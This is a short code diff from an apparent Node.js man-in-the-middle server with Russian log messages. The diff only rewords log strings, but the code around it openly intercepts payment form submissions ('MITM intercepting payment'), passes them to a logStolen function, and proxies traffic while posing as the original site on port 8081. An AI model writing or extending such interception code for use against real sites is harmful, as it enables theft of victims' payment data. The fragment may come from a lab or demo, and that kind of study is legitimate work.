@@ -36,7 +36,7 @@ app.get('/', (req, res) => {
 });
 
 app.post("/api/payment", (req, res) => {
-    console.log("MITM  Перехватываем оплату");
+    console.log("MITM  Перехват оплаты");
     logStolen(req.body, 'payment_form');
     
     res.json({ 
@@ -55,10 +55,10 @@ app.use((req, res) => {
 });
 
 proxy.on('error', (err, req, res) => {
-    console.log('Прокси ошибка:', err.message);
+    console.log('Прокси ошибка - ', err.message);
     res.status(500).send('Server error');
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`MITM-сервер (подменяет оригинал) → http://localhost:8081`);
+    console.log(`MITM-сервер (подменяет оригинал) - http://localhost:8081`);
 });
